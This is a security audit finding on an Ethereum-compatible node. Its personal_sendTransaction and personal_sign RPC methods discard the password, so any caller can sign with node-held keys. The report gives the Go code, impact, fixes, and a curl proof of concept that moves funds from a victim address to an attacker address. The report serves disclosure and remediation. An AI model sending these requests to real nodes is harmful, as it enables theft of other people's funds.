### Title
Password Authentication Bypass in `personal_sendTransaction` and `personal_sign` Enables Unauthorized Fund Transfer and Arbitrary Signing — (`File: rpc/namespaces/ethereum/personal/api.go`)

### Summary

The `personal_sendTransaction` and `personal_sign` JSON-RPC methods accept a `password` parameter that is documented as the credential required to decrypt and use the private key, but both methods silently discard the password entirely. Any caller with access to the JSON-RPC endpoint can send transactions from — or sign arbitrary data with — any account managed by the node's keyring, without knowing the password.

### Finding Description

In `rpc/namespaces/ethereum/personal/api.go`, both sensitive methods use Go's blank identifier `_` for the password argument, meaning it is never forwarded to any authentication or decryption step:

```go
// personal_sendTransaction — password is the third argument, silently dropped
func (api *PrivateAccountAPI) SendTransaction(_ context.Context, args evmtypes.TransactionArgs, _ string) (common.Hash, error) {
    api.logger.Debug("personal_sendTransaction", "address", args.To.String())
    return api.backend.SendTransaction(args)   // no password passed
}

// personal_sign — password is the fourth argument, silently dropped
func (api *PrivateAccountAPI) Sign(_ context.Context, data hexutil.Bytes, addr common.Address, _ string) (hexutil.Bytes, error) {
    api.logger.Debug("personal_sign", "data", data, "address", addr.String())
    return api.backend.Sign(addr, data)        // no password passed
}
``` [1](#0-0) 

The docstring for `SendTransaction` explicitly states *"If the given password isn't able to decrypt the key it fails"*, and the docstring for `Sign` states *"The key used to calculate the signature is decrypted with the given password"* — both claims are false. The backend `Sign` and `SendTransaction` implementations call `Keyring.SignByAddress` and `msg.Sign(signer, b.clientCtx.Keyring)` directly, with no password verification at any layer. [2](#0-1) [3](#0-2) 

The compounding factor is that `LockAccount` and `UnlockAccount` are both stubs that do nothing (returning `false`/`nil` with a TODO comment), so there is no compensating lock/unlock gate either: [4](#0-3) 

The `personal` namespace is registered with `Public: false` in `rpc/apis.go`, which in go-ethereum's RPC framework restricts it to IPC by default. However, the namespace is still a first-class selectable API entry in `selectedAPIs`, and operators routinely enable it over HTTP/WebSocket for tooling compatibility. Even under IPC-only exposure, any local process on the node host can exploit this without a password. [5](#0-4) 

### Impact Explanation

**Critical / High.** Via `personal_sendTransaction`, an attacker with access to the JSON-RPC endpoint can construct a `TransactionArgs` with `From` set to any address in the node's keyring and `To` set to an attacker-controlled address, and the node will sign and broadcast the transaction without any password check. This constitutes an unauthorized transfer of EVM-denom funds from any node-managed account. Via `personal_sign`, the attacker can obtain a valid ECDSA signature over arbitrary data from any node-managed key, enabling forged authorizations (e.g., EIP-712 permit signatures, meta-transactions).

### Likelihood Explanation

The `personal` namespace is commonly enabled by node operators for Ethereum tooling compatibility (MetaMask, Hardhat, Foundry). Any process or user that can reach the JSON-RPC port — including any local process under IPC, or any remote caller if the operator has enabled HTTP/WebSocket — can exploit this with a single well-formed JSON-RPC call. No special privileges, leaked keys, or chain-level access are required.

### Recommendation

- **Short term:** In `SendTransaction` and `Sign`, accept the password as a named parameter and pass it to the keyring's signing call. If the keyring backend does not support password-gated signing, return an explicit error rather than silently proceeding.
- **Long term:** Implement `LockAccount`/`UnlockAccount` properly so that signing is gated on an explicit unlock step with password verification, matching the Geth `personal_` security model. Until then, document clearly that the password parameter is not enforced and warn operators against exposing the `personal` namespace over HTTP/WebSocket.

### Proof of Concept

```bash
# 1. Start an Ethermint node with the personal namespace enabled
evmd start --json-rpc.api eth,personal

# 2. Identify a node-managed address (no password needed)
curl -s -X POST http://localhost:8545 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"personal_listAccounts","params":[],"id":1}'
# Returns: {"result":["0xVICTIM_ADDRESS",...]}

# 3. Send funds from the victim address to attacker — any password string works, including ""
curl -s -X POST http://localhost:8545 \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc":"2.0","method":"personal_sendTransaction",
    "params":[{
      "from":"0xVICTIM_ADDRESS",
      "to":"0xATTACKER_ADDRESS",
      "value":"0xDE0B6B3A7640000"
    }, "wrong_password_ignored"],
    "id":2
  }'
# Returns a valid tx hash — funds transferred without password verification
```

The password `"wrong_password_ignored"` is accepted because `SendTransaction` discards it at line 131 before calling `api.backend.SendTransaction(args)` at line 133, which proceeds directly to sign and broadcast. [6](#0-5)
